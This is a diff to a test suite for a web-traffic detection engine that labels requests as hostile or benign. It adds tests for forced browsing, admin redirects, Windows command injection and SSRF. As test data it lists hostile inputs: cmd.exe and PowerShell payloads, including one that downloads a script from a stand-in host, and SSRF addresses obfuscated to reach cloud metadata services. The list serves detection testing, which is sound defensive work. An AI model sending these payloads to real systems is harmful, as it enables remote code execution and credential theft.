@@ -303,6 +303,46 @@ def test_directory_enumeration_is_seen_across_requests(engine: RuleEngine) -> No
     assert any(item.label.rule_id == "directory_enumeration" for item in labelled)
 
 
+def test_forced_browsing_that_succeeds_is_seen_across_requests(engine: RuleEngine) -> None:
+    """A refusal and a success on admin paths, from one client, inside a window.
+
+    The single request `GET /admin/ 200` is the same line whether an
+    administrator sent it or somebody who should not be there did. What
+    separates them is what else the client collected, which is why this is a
+    window rule.
+    """
+    refused = [
+        request(f"/admin/{name}", status=403, seconds=n * 5)
+        for n, name in enumerate(("users", "orders", "keys"))
+    ]
+    through = [request("/admin/ping", status=200, seconds=20)]
+
+    labelled = engine.label_events([*refused, *through])
+
+    assert any(item.label.rule_id == "forced_browsing_succeeded" for item in labelled)
+
+
+def test_an_administrator_who_is_never_refused_is_left_alone(engine: RuleEngine) -> None:
+    """The control, and the reason `client_error_ratio` is the discrimination.
+
+    A legitimate administrator's admin traffic is a bounce to the login form and
+    then successes. A 302 is not a 4xx, so the ratio stays zero and the rule
+    above never sees them — which is the whole difference between this rule and
+    the false alarm that `admin_area_redirect` used to be.
+    """
+    events = [
+        request("/admin/users", status=302, seconds=0),
+        request("/admin/users", status=200, seconds=5),
+        request("/admin/orders", status=200, seconds=10),
+        request("/admin/", status=200, seconds=15),
+    ]
+
+    labelled = engine.label_events(events)
+
+    fired = [item.label.rule_id for item in labelled]
+    assert "forced_browsing_succeeded" not in fired, f"fired on an administrator: {fired}"
+
+
 def test_human_paced_directory_enumeration_is_detected(engine: RuleEngine) -> None:
     seconds = [0, 40, 80, 120, 160, 200, 240, 300]
     targets = [f"/quiet-probe-{n % 6}" for n in range(8)]
@@ -417,6 +457,34 @@ def test_the_same_path_answered_normally_is_the_site_running_that_software(
     )
 
 
+@pytest.mark.parametrize("target", ["/admin/users", "/admin/", "/administrator/"])
+def test_an_admin_path_redirected_to_a_login_form_is_not_an_attack(
+    engine: RuleEngine, target: str
+) -> None:
+    """The first request of every legitimate administrator's visit.
+
+    An application that protects `/admin` with a login form answers an
+    unauthenticated request to it with a 302 to that form. So does one being
+    probed. The redirect alone does not separate them, and for a long time this
+    ruleset acted as though it did.
+
+    Measured on `2026-09-18-medium`, the first corpus to contain an
+    administrator doing ordinary work: the rule fired on 179 requests, 13 of
+    them hostile and 166 not, a precision of 0.073. Those 166 were 166 of the
+    167 false alarms the whole ruleset produced across 236,505 requests — one
+    rule accounting for all but one of them.
+
+    It is kept rather than deleted because being sent to a login form is worth
+    reporting; it is `authentication` because that is what it is, and it is what
+    the ground truth calls all 165 of the administrator's.
+    """
+    (labelled,) = engine.label_events([request(target, status=302)])
+
+    assert not labelled.label.category.is_hostile, (
+        f"{target!r} at 302 matched {[label.rule_id for label in labelled.all_labels]}"
+    )
+
+
 @pytest.mark.parametrize("target", ["/admin.php", "/shell.php", "/phpmyadmin/"])
 def test_a_probe_that_sends_no_user_agent_stays_reconnaissance(
     engine: RuleEngine, target: str
@@ -456,23 +524,25 @@ def test_a_secret_probe_stays_reconnaissance_rather_than_becoming_enumeration(
     assert labelled.label.rule_id == "config_file_exposure"
 
 
-def test_a_redirect_away_from_an_admin_page_is_a_refusal(engine: RuleEngine) -> None:
-    """Most applications refuse an unauthenticated admin request with a 302.
+def test_a_redirect_away_from_an_admin_page_is_still_noticed(engine: RuleEngine) -> None:
+    """The redirect is reported; what changed is what it is reported as.
 
-    `admin_area_probe` tested `status >= 400`, which assumes the server answers
-    a refusal with 401 or 403. Real applications mostly do not: they redirect to
-    the login form, and a redirect is 302.
+    `admin_area_probe` tests 401 and 403, which assumes the server refuses that
+    way. Real applications mostly redirect to a login form instead, and a
+    redirect is 302 — so on the committed excerpt, where the truth marks 24
+    requests `access_control`, that rule reached none of them. This one was
+    added to reach them, and it does.
 
-    Measured on the committed excerpt, where the ground truth marks 24 requests
-    as `access_control`: the rule as written reached **none** of them, and that
-    is the whole of why the category scored 0.000 on the headline corpus.
-    Accepting 302 and 303 reaches 13 of the 24 and claims nothing it did not
-    claim before.
+    It was then filed as `access_control` for a month, and that part was wrong:
+    a legitimate administrator receives exactly the same redirect. See
+    `test_an_admin_path_redirected_to_a_login_form_is_not_an_attack` for the
+    measurement that settled it. This test keeps the half that was right — the
+    redirect is still something the tool notices and reports — so that a future
+    fix for the category cannot quietly stop it firing at all.
     """
     (labelled,) = engine.label_events([request("/admin/users", status=302)])
 
     assert labelled.label.rule_id == "admin_area_redirect"
-    assert labelled.label.category is ActivityCategory.ACCESS_CONTROL
 
 
 def test_reaching_an_admin_page_successfully_is_not_a_refusal(
@@ -934,6 +1004,85 @@ def test_traffic_certified_harmless_stays_quiet(engine: RuleEngine, target: str)
 
 #: Real paths from the shopfront excerpt's asset bundle, chosen because each
 #: one contains a word an action rule is interested in.
+WINDOWS_ATTACKS: list[str] = [
+    # FOR, in all four switch forms cmd.exe accepts, plus the switchless loop.
+    "/get?foo=for /f %variable in (fileset) do command",
+    "/get?foo=for /d %variable in (set) do command",
+    r"/get?foo=for /r c:\ %variable in (set) do command",
+    "/get?foo=for /l %variable in (1,1,2) do command",
+    "/get?foo=for %variable in (set) do command",
+    "/get?foo=for %%G in (a b c) do echo %%G",
+    # IF, which is three syntaxes wearing one word.
+    r"/get?foo=if /i not exist c:\nonexistent echo hey",
+    "/get?foo=if defined foo echo yes",
+    "/get?foo=if errorlevel 1 echo fail",
+    "/get?foo=if [%1]==[] echo value missing",
+    "/get?foo=if red==red echo test",
+    "/get?foo=if not red===red echo test",
+    "/get?foo=if 2 geq 15 echo bigger",
+    '/get?foo=if "2" geq "15" echo bigger',
+    "/get?foo=if (2 geq 15) echo bigger",
+    # Naming the interpreter rather than writing syntax for it.
+    "/get?cmd=cmd.exe /c dir",
+    "/get?x=%COMSPEC% /c whoami",
+    "/get?932120-1=Invoke-WebRequest http://example.com/path/file.ps1",
+    "/get?cmd=;iwr http://example.com/path/file.ps1",
+    "/get?cmd=;iwmi -class Win32_Process -name Create -ArgumentList cmd",
+    "/get?x=powershell.exe -inputformat none write 1",
+]
+
+#: Requests the CRS corpus certifies as harmless in family 932, and which every
+#: pattern in `attack/windows.yaml` was shaped around. Each one is traffic
+#: somebody reported a rule firing on, so each is a mistake already paid for by
+#: someone else.
+WINDOWS_BENIGN: list[str] = [
+    # `for` is an English word. A bare for would take this and every search
+    # box on the web with it.
+    "/get?x=find x for y",
+    # `time` is a Windows command and half a company name.
+    "/get?foo=time warner",
+    "/get?test=time express",
+    # `cmd` is the commonest parameter name there is, and this one is prose.
+    "/get?cmd=go to store. at the store, shop.",
+    # Words that contain command names without being them.
+    "/get?word=evaluation",
+    "/get?args=environment",
+    "/get?args=performance",
+    "/get?args=comment",
+    "/get?word=schedule",
+    # Brackets and globs in ordinary values.
+    "/get?page=page[1]",
+    "/get?id=does the * shine bright?",
+]
+
+
+@pytest.mark.parametrize("target", WINDOWS_ATTACKS)
+def test_windows_batch_payloads_are_caught(engine: RuleEngine, target: str) -> None:
+    """CRS family 932 sat at 9% recall until this pack existed, and 163 of the
+    368 misses were these shapes. ADR-0007 named Windows batch as the single
+    biggest hole a year before the pack was written."""
+    (labelled,) = engine.label_events([request(target)])
+
+    assert labelled.all_labels, f"nothing matched {target!r}"
+    assert any(label.category.is_hostile for label in labelled.all_labels), (
+        f"{target!r} matched only {[one.rule_id for one in labelled.all_labels]}"
+    )
+
+
+@pytest.mark.parametrize("target", WINDOWS_BENIGN)
+def test_windows_rules_stay_off_ordinary_words(engine: RuleEngine, target: str) -> None:
+    """The half that decides whether the recall above is worth anything.
+
+    Every one of these contains a Windows command name or a batch-looking
+    character and is ordinary traffic. A pack that took them would have bought
+    45% recall with a tool nobody trusts.
+    """
+    (labelled,) = engine.label_events([request(target)])
+
+    hostile = [one.rule_id for one in labelled.all_labels if one.category.is_hostile]
+    assert not hostile, f"{target!r} was called hostile by {hostile}"
+
+
 STATIC_ASSETS: list[str] = [
     "/assets/js/autocomplete.js",
     "/assets/js/cart.js",
@@ -1120,3 +1269,142 @@ def test_the_files_every_crawler_fetches_are_not_probes(engine: RuleEngine, targ
     assert not any(item.category.is_hostile for item in labelled.all_labels), (
         f"{target!r} was claimed by {[item.rule_id for item in labelled.all_labels]}"
     )
+
+
+#: SSRF targets written so a host check will not recognise them. Every one is a
+#: CRS family 934 case that nothing in this tree caught when the family scored
+#: 17%, and they are the largest single shape in that family's misses.
+#:
+#: The three groups below are three different evasions of the same check, and
+#: they need three different patterns because they have nothing in common after
+#: the scheme.
+SSRF_OBFUSCATED: list[str] = [
+    # An internal target named plainly, but in a parameter the old allow-list
+    # of names did not cover. `ssrf=` is not `url=`, and an attacker uses
+    # whatever the application calls its parameter.
+    "/get/test?ssrf=http://169.254.169.254/computeMetadata/v1/",
+    "/get/test?ssrf=http://169.254.169.254/metadata/v1.json",
+    "/get/test?ssrf=http://169.254.169.254/openstack",
+    "/get/test?ssrf=https://metadata.packet.net/userdata",
+    "/get/test?ssrf=http://192.0.0.192/latest/user-data/",
+    # A scheme with no slashes after it, which browsers and libraries both
+    # still resolve.
+    "/get/test?ssrf=http:127.0.0.1",
+    "/get?ssrf=http://[::]/",
+    # The address as one integer. 2852039166 is 169.254.169.254.
+    "/get?ssrf=http://2852039166/",
+    "/get?ssrf=http://7147006462/",
+    "/get?ssrf=http:2852039166",
+    "/get?ssrf=http:/2852039166",
+    "/get?ssrf=http:123456789",
+    # Partly collapsed — two octets joined into one number.
+    "/get?ssrf=http://169.254.43518/",
+    "/get?ssrf=http://169.16689662/",
+    # Hexadecimal, whole or per octet.
+    "/get?ssrf=http://0xA9FEA9FE/",
+    "/get?ssrf=http://0xA9.0xFE.0xA9.0xFE/",
+    "/get?ssrf=http://0x41414141A9FEA9FE/",
+    "/get?ssrf=http:0xA9FEA9FE",
+    # Octal, which a leading zero is enough to trigger.
+    "/get?ssrf=http://0251.0376.0251.0376/",
+    "/get?ssrf=http://0251.00376.000251.0000376/",
+    "/get?ssrf=ssh://0177.00.00.01",
+    "/get?ssrf=rtmp://017700000001",
+    "/get?ssrf=http:0251.0376.0251.0376",
+    # IPv6, including the mapped forms that carry a v4 address inside.
+    "/get?ssrf=http://[::ffff:a9fe:a9fe]",
+    "/get?ssrf=http://[0:0:0:0:0:ffff:a9fe:a9fe]",
+    "/get?ssrf=http://[0:0:0:0:0:ffff:169.254.169.254]",
+    "/get?ssrf=http://[0:0:0:0:0:0:169.254.169.254]",
+    "/get?ssrf=xri://[0:0:0:0:0:ffff:169.254.169.254]",
+    "/get?ssrf=rsync://[0:0:0:0:0:ffff:169.254.169.254]",
+    "/get?ssrf=http:[::ffff:a9fe:a9fe]",
+    "/get?ssrf=http://[a::]",
+    "/get?ssrf=http://[a::b]",
+    "/get?ssrf=http://[dead:beef:dead::beef:dead:beef:dead]",
+    "/get?ssrf=http://[fe80::%zone1]",
+    "/get?ssrf=http://[fe80::dead:beef:dead:beef:dead:beef%zone1]",
+    # A separator that is not a full stop. NFKC folds circled and full-width
+    # digits back to ASCII, so those arrive here already plain — but U+3002,
+    # the ideographic full stop, is not a compatibility form of `.` and
+    # survives normalisation intact.
+    "/get?ssrf=http://169\u3002254\u3002169\u3002254/",
+    # Backslashes between the letters of a host name, which a permissive
+    # resolver strips and a regex for `localhost` does not.
+    #
+    # **Both counts, and the doubled one is the corpus's.** The first version of
+    # this list carried only the single-backslash form, which is what you write
+    # if you invent the payload instead of reading it; the pattern was built to
+    # match that, the test went green, and the two real cases went on getting
+    # through. `query_decoded` for them is
+    # `ssrf=http://\\l\\o\\c\\a\\l\\h\\o\\s\\t/` — two backslashes per letter.
+    r"/get?ssrf=http://\l\o\c\a\l\h\o\s\t/",
+    r"/get?ssrf=http://\g\o\o\g\l\e.\c\o\m/",
+    r"/get?ssrf=http://\\l\\o\\c\\a\\l\\h\\o\\s\\t/",
+    r"/get?ssrf=http://\\g\\o\\o\\g\\l\\e.\\c\\o\\m/",
+]
+
+#: Requests the corpus certifies as harmless that the rules above had to be
+#: shaped around. The first is the one that decided the whole design.
+SSRF_BENIGN: list[str] = [
+    # **This is why every pattern above requires a scheme.** A bare
+    # `127.0.0.1` is certified harmless here, and a rule matching the address
+    # alone would take it.
+    "/get?x=ping 127.0.0.1",
+    # A host in a parameter with no scheme at all, which is how an ordinary
+    # application passes a domain around.
+    "/get/test?url=example.com/",
+    # Passing a public URL in a query string is one of the most ordinary
+    # things on the web — a redirect, an OAuth callback, a share link.
+    "/page?url=https://example.com",
+    "/get/www/delivery/lg.php?bannerid=18&campaignid=1&zoneid=4"
+    "&loc=https://www.example.com/foo/bar/x-x/x?s=2014-11-01&e=2020-10-31&ex=",
+    # Numbers in parameters, which are everywhere, and none of them a host.
+    "/get?page=12345678",
+    "/get?order=0251",
+    # Ordinary words containing scheme-like and host-like fragments.
+    "/search?w=hello world",
+    "/get?word=evaluation",
+    # **From the labelled real log, and the reason the parameter-name
+    # allow-list had to go rather than merely grow.** `/admin/ping` is a
+    # diagnostic tool and `127.0.0.1` is what you point one at. The old rule
+    # matched `host=` plus a loopback address and called four of these SSRF —
+    # including one from the legitimate administrator at 192.0.2.22, arriving
+    # from a browser with a referer from `/admin/orders`. The truth calls them
+    # `access_control` and `reconnaissance`; none of them is SSRF, and `ssrf`
+    # precision on that log was 0.429 because of them.
+    "/admin/ping?host=127.0.0.1",
+]
+
+
+@pytest.mark.parametrize("target", SSRF_OBFUSCATED)
+def test_an_ssrf_target_written_to_evade_a_host_check_is_still_ssrf(
+    engine: RuleEngine, target: str
+) -> None:
+    """CRS family 934 scored 17% and this shape was its largest single miss.
+
+    The evasions are the evidence, not an obstacle to it: nobody writes
+    `http://0xA9FEA9FE/` by accident, and an address that has been rewritten to
+    get past a check is a stronger signal than the plain one it replaced.
+    """
+    (labelled,) = engine.label_events([request(target)])
+
+    assert labelled.all_labels, f"nothing matched {target!r}"
+    assert any(label.category.is_hostile for label in labelled.all_labels), (
+        f"{target!r} matched only {[one.rule_id for one in labelled.all_labels]}"
+    )
+
+
+@pytest.mark.parametrize("target", SSRF_BENIGN)
+def test_ssrf_rules_leave_ordinary_urls_and_numbers_alone(engine: RuleEngine, target: str) -> None:
+    """The half that decides whether the recall above is worth anything.
+
+    `/get?x=ping 127.0.0.1` is the important one. It carries a loopback address
+    and the corpus certifies it harmless, so the address alone cannot be the
+    signal — which is why every pattern in the pack requires a URL scheme in
+    front of it.
+    """
+    (labelled,) = engine.label_events([request(target)])
+
+    hostile = [one.rule_id for one in labelled.all_labels if one.category.is_hostile]
+    assert not hostile, f"{target!r} was called hostile by {hostile}"
